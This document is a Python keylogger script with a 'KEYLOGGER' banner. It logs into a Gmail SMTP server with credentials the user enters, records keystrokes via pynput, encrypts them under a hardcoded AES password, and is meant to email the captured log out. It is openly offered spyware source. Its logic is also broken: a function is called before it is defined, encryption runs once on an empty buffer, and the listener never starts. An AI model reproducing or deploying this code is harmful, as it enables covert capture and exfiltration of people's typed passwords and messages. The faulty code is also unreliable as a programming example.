#! /usr/bin/python3

#Imports
import getpass
import smtplib
import Cryptodome
import pyaes, pbkdf2, binascii, os, secrets
from pynput.keyboard import Key, Listener




# Logo
print ("""================================================================""")
print (r"""
 _   __ _____ __   __ _      _____  _____  _____  _____ ______ 
| | / /|  ___|\ \ / /| |    |  _  ||  __ \|  __ \|  ___|| ___ \
| |/ / | |__   \ V / | |    | | | || |  \/| |  \/| |__  | |_/ /
|    \ |  __|   \ /  | |    | | | || | __ | | __ |  __| |    / 
| |\  \| |___   | |  | |____\ \_/ /| |_\ \| |_\ \| |___ | |\ \ 
\_| \_/\____/   \_/  \_____/ \___/  \____/ \____/\____/ \_| \_|
                                                             """)
print ("""================================================================""")
print(""" By: CTC """)

#Asks for input, then logs in to a mail account and sends the input to itself (Disable google authentication or it doesn't work)
#Resource from: https://realpython.com/python-send-email/
email = input('Enter Your Email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#Building the keylogger function
data_to_be_encrypted = ''
full_log = ''
word = ''
email_char_lim = 10

def on_press(key):
    global word
    global full_log
    global email
    global email_char_lim
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
    if len(full_log) >= email_char_lim:
            full_log = data_to_be_encrypted
            full_log = ''
    elif key == Key.shift_1 or key == Key.shift_r:
           return
    elif key == Key.backspace:
      word = word[:-1]
    else:
       char = f'{key}'
       char = char[1:-1]
       word += char
   
    if key == Key.esc:
     return False

#Encryption function

# We derive a 256-bit AES encryption key from the password
password = "passw0rd"
passwordSalt = os.urandom(16)
key = pbkdf2.PBKDF2(password, passwordSalt).read(32)

# Encrypts the plaintext with the given key:
iv = secrets.randbits(256)
plaintext = data_to_be_encrypted
aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
ciphertext = aes.encrypt(plaintext)

#if ciphertext is the same lenght as email_char_limit everything is reseted
if len(ciphertext) >= email_char_lim:
        send_log()
        data_to_be_encrypted = ''
        plaintext = ''
        full_log = ''
        ciphertext = ''
     


#This shit ddefines the send_log function 
def send_log():
    server.sendmail(
          email,
          email,
          ciphertext
     )
#Listener stuff
with Listener( on_press=on_press ) as listener:
     listener.join
